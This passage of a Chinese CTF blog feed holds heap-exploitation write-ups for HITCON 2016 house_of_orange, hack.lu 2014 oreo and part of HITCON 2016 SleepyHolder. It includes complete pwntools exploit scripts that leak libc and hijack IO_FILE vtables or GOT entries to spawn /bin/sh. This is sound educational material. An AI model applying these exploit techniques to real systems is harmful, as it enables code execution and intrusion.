payload)</span><br></pre></td></tr></table></figure></li><li><p>触发漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><p>调用<code>build</code>函数，由最初的分析可知，此处会申请3个chunk。</p><ul><li>申请第一个chunk时，大小为0x20，因为<code>fastbin</code>中没有chunk，所以会进入大循环，将我们前面构造好的chunk放入<code>smallbin 0x60</code>。</li><li>在从<code>unsorted bin</code>中取出这个chunk时，又会触发<code>unsortedbin attack</code>，改写<code>_IO_list_all</code>指针。至此，所有数据都布置好了。</li><li>因为<code>unsortedbin attack</code>的时候破坏了<code>unsorted bin</code>的链表结构，所以接下来的分配过程会出现错误，系统调用<code>malloc_printerr</code>去打印错误信息，从而被我们劫持流程，执行到<code>system</code>函数。</li></ul></li></ol><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./house_of_orange'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./house_of_orange'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(size, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Length of name :'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'Price of Orange:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Color of Orange:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(size, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Length of name :'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'Price of Orange: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Color of Orange: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">upgrade(<span class="number">0x100</span>, payload)</span><br><span class="line"><span class="comment">#将topchunk放入unsortedbin</span></span><br><span class="line">build(<span class="number">0x1000</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"><span class="comment">#从unsortedbin中取出一部分topchunk</span></span><br><span class="line">build(<span class="number">0x400</span>, <span class="string">'a'</span>*<span class="number">0x8</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">libc_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3C2DC8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : %#x"</span> % libc_base </span><br><span class="line">upgrade(<span class="number">0x400</span>, <span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0xc0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr : %#x"</span> % heap_addr</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system : %#x"</span> % system</span><br><span class="line"><span class="keyword">print</span> <span class="string">"_IO_list_all : %#x"</span> % IO_list_all</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x400</span>   <span class="comment">#padding</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)   <span class="comment">#padding</span></span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)  <span class="comment">#padding</span></span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)   <span class="comment"># fp; size</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(IO_list_all - <span class="number">0x10</span>)   <span class="comment"># fd; bk</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)    <span class="comment"># _IO_write_base ; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)   <span class="comment">#padding</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># mode &lt;= 0</span></span><br><span class="line"></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)  <span class="comment">#padding</span></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x5d0</span>)   <span class="comment">#vtable指针</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(system)  <span class="comment"># 将__overflow改为system</span></span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">0x800</span>, payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="程序链接"><a href="#程序链接" class="headerlink" title="程序链接"></a>程序链接</h1><p><a href="https://github.com/ctfs/write-ups-2016/raw/master/hitcon-ctf-2016/pwn/house-of-orange-500/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682" target="_blank" rel="noopener">house of orange</a></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这篇文章写得是真的乱233333<br>在写好exp后，运行最后会报<code>memory corruption</code>，我还以为出错了，又调了半天_(:зゝ∠)_，最后才反应过来程序本来就要调用<code>malloc_printerr</code>。。。默默输了个<code>ls</code>，看到回显感动得一匹。<br>话说这exp有一定概率会失败，并不清楚原因_(:зゝ∠)_。</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 堆利用学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> house_of_orange </tag>
            
            <tag> IO_FILE </tag>
            
            <tag> unsortedbin_attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hack.lu2014-oreo writeup</title>
      <link href="/post/1b661c73.html"/>
      <url>/post/1b661c73.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：hack.lu CTF 2014<br>知识点：house of spirit<br>挺老的一道题目了，不过是how2heap和ctfwiki上的例题。题目是一个买卖枪支的系统，同样是常规的增删查改，32位程序。<br><a id="more"></a><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the OREO Original Rifle Ecommerce Online System!</span><br><span class="line">What would you like to do?</span><br><span class="line"></span><br><span class="line">1. Add new rifle</span><br><span class="line">2. Show added rifles</span><br><span class="line">3. Order selected rifles</span><br><span class="line">4. Leave a Message with your Order</span><br><span class="line">5. Show current stats</span><br><span class="line">6. Exit!</span><br><span class="line">Action:</span><br></pre></td></tr></table></figure><p></p><p>保护如下：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/nick/pwn_learn/heapLearn/house_of_spirit/hack-lu2014_oreo&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure><p></p><h2 id="程序概况"><a href="#程序概况" class="headerlink" title="程序概况"></a>程序概况</h2><p><strong>add函数：</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v1 = head;</span><br><span class="line">head = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">56u</span>);</span><br><span class="line"><span class="keyword">if</span> ( head )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)head + <span class="number">13</span>) = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">    fgets(head + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(head + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">    fgets(head, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(head);</span><br><span class="line">    ++cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>函数会读取名称和描述，并将<strong>名称</strong>、<strong>描述</strong>以及<strong>上一个枪支的地址</strong>一起存入结构体中，构成一个链表结构。结构体如下：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 description     db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure><p></p><p>同时注意到，fgets函数读取的长度为56个字节，所以可以发生<strong>溢出</strong>。</p><p><strong>show函数：</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = head; i; i = (rifle *)i-&gt;next )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, i-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==================================="</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>通过链表依次访问每个枪支，输出名称和描述。</p><p><strong>Free函数</strong>(Order)<strong>：</strong><br>遍历链表，依次将所有枪支都free掉，然后将链表头置0</p><p><strong>message函数：</strong><br>向<code>dword_804A2A8</code>指向的地址写入字符串。而在程序开头<code>dword_804A2A8 = (char *)&amp;unk_804A2C0;</code>，所以是向unk_804A2C0处写入。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A2A8 dword_804A2A8   dd ?                    ; DATA XREF: leave_message+23↑r</span><br><span class="line">.bss:0804A2A8                                         ; leave_message+3C↑r ...</span><br><span class="line">.bss:0804A2AC                 align 20h</span><br><span class="line">.bss:0804A2C0 unk_804A2C0     db    ? ;               ; DATA XREF: main+29↑o</span><br><span class="line">.bss:0804A2C1                 db    ? ;</span><br><span class="line">.bss:0804A2C2                 db    ? ;</span><br><span class="line">.bss:0804A2C3                 db    ? ;</span><br></pre></td></tr></table></figure><p></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>因为程序通过<strong>链表</strong>来管理枪支，恰好在枪支结构体中存在溢出，所以可以通过<strong>从name溢出到next指针</strong>，将next修改到任意地址，再通过show就可以任意地址读了。这里可以通过泄露puts_got,然后通过偏移来算出libc基址。</p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>因为可以控制next指针，也就意味着可以在任意地方free，那么可以构造house of spirit。如果可以在massage指针<code>dword_804A2A8</code>处布置好一个fake chunk用于绕过free的检查，那么就可以在此处分配一个chunk，massage指针将会被控制，从而实现任意地址写。</p><h4 id="构造fake-chunk"><a href="#构造fake-chunk" class="headerlink" title="构造fake chunk"></a>构造fake chunk</h4><p>若要让<code>dword_804A2A8</code>在chunk内部，首先需要在它的上方构造出这个chunk的<strong>size</strong>，可以发现，在对枪支进行计数的<code>cnt</code>变量刚好在<code>0x804A2A4</code>的位置，所以只需要添加一定数量的枪支，就可以达到我们想要的size。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A2A0 dword_804A2A0   dd ?                    ; DATA XREF: Free+5A↑r</span><br><span class="line">.bss:0804A2A0                                         ; Free+62↑w ...</span><br><span class="line">.bss:0804A2A4 cnt             dd ?                    ; DATA XREF: add+C5↑r</span><br><span class="line">.bss:0804A2A4                                         ; add+CD↑w ...</span><br><span class="line">.bss:0804A2A8 ; char *dword_804A2A8</span><br><span class="line">.bss:0804A2A8 dword_804A2A8   dd ?                    ; DATA XREF: leave_message+23↑r</span><br><span class="line">.bss:0804A2A8                                         ; leave_message+3C↑r ...</span><br><span class="line">.bss:0804A2AC                 align 20h</span><br></pre></td></tr></table></figure><p></p><p>因为一个枪支结构体的大小为0x38，加上chunk header后的size属于0x40这个fast bin，所以需要将fake chunk的size设置为0x40，也就是添加0x40个枪支<br>然后需要<strong>绕过对next chunk的检查</strong>，通过写入message，将对应next chunk的size和prevsize都构造好。（详见exp）<br>构造好后：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x804a288:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804a298:0x000000000x000000000x000000010x00000041 &lt;== size</span><br><span class="line">0x804a2a8:0x0804a2c00x000000000x000000000x00000000 &lt;== message指针</span><br><span class="line">0x804a2b8:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804a2c8:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x804a2d8:0x000000000x000000000x000000400x00000050 &lt;== prevsize size</span><br></pre></td></tr></table></figure><p></p><h4 id="实现任意地址写"><a href="#实现任意地址写" class="headerlink" title="实现任意地址写"></a>实现任意地址写</h4><p>在fake chunk构造好后，就可以将<code>dword_804A2A8</code>写入next指针，然后free，在message指针处构造好的fake chunk将会进入fast bin。<br>重新添加枪支，fake chunk将会从bins中取出，通过设置枪支的description，就可以修改massage指针了，此时在调用message函数就能实现任意地址写</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><blockquote><p>程序中没有setvbuf，所以不会及时的回显数据，在编写exp时有些时候不用recv</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p =  process(<span class="string">'./hack-lu2014_oreo'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hack-lu2014_oreo'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'=\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaveMsg</span><span class="params">(msg)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.sendline(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">27</span> + p32(addr), <span class="string">'a'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">res = u32(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)[:<span class="number">4</span>])</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露libc</span></span><br><span class="line">libc_base = leak(elf.got[<span class="string">'puts'</span>]) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : %#x"</span> % libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system : %#x"</span> % system</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加0x40个枪支，构造size位</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0x40</span><span class="number">-1</span>):</span><br><span class="line">add(<span class="string">'a'</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment">#将massage指针的地址写到next指针中</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x0804A2A8</span>), <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造next chunk，将prevsize设为0x40，size设为0x50</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x50</span>)</span><br><span class="line">leaveMsg(payload)</span><br><span class="line"><span class="comment">#把fake chunk放入fast bin</span></span><br><span class="line">free()</span><br><span class="line">p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#重新把fake chunk分配出来，并在description写入strlen_got，相当于将message指针改为指向strlen的got表</span></span><br><span class="line">add(<span class="string">'a'</span> ,p32(elf.got[<span class="string">'strlen'</span>]))</span><br><span class="line"><span class="comment">#写入message，相当于向strlen_got中写入system。</span></span><br><span class="line"><span class="comment">#因为在leaveMsg函数中，fgets之后就会调用strlen，所以顺便就可以getshell了</span></span><br><span class="line"><span class="comment">#这里使用分号是因为linux命令中可以使用';'来分割两条指令，所以这里相当于把/bin/sh当做第二条执行的指令了，而第一个p32(system)是个无效指令罢了</span></span><br><span class="line">leaveMsg(p32(system) + <span class="string">';/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/house_of_spirit/hack-lu2014_oreo" target="_blank" rel="noopener">oreo</a><br>writeup参考：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/fastbin_attack/#2014-hacklu-oreo" target="_blank" rel="noopener">ctfwiki</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> writeup </tag>
            
            <tag> ctfwiki </tag>
            
            <tag> how2heap </tag>
            
            <tag> house_of_spirit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitcon2016-SleepyHolder writeup</title>
      <link href="/post/e99b1303.html"/>
      <url>/post/e99b1303.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：HITCON CTF 2016<br>知识点：unlink、double free<br>这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。<br><a id="more"></a><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Waking Sleepy Holder up ...</span><br><span class="line">Hey! Do you have any secret?</span><br><span class="line">I can help you to hold your secrets, and no one will be able to see it :)</span><br><span class="line">1.Keep secret</span><br><span class="line">2.Wipe secret</span><br><span class="line">3.Renew secret</span><br></pre></td></tr></table></figure><p></p><p>程序保护如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder&apos;</span><br><span class="line">     Arch:     amd64-64-little</span><br><span class="line">     RELRO:    Partial RELRO</span><br><span class="line">     Stack:    Canary found</span><br><span class="line">     NX:       NX enabled</span><br><span class="line">     PIE:      No PIE</span><br></pre></td></tr></table></figure><p></p><h2 id="程序概况"><a href="#程序概况" class="headerlink" title="程序概况"></a>程序概况</h2><p><strong>keep函数：</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What secret do you want to keep?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">3. Keep a huge secret and lock it forever</span><br></pre></td></tr></table></figure><p></p><p>根据选择不同的secret申请不同大小的内存，分别是40、4000、400000个字节。其中每个大小的chunk只能申请一次。</p><p><strong>wipe函数：</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    dword_6020E0 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v0 == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(qword_6020C0);</span><br><span class="line">    dword_6020D8 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>只能删除small和big两种secret。free之后没有清空指针，存在double free漏洞</p><p><strong>renew函数：</strong><br>同样只能重写small和big两种secret，因为会检查是否使用的标记，所以不能UAF</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>因为free之后没有清空指针，所以可以造成double free漏洞。这里double free可以用于辅助unlink。</p><h4 id="修改inuse位"><a href="#修改inuse位" class="headerlink" 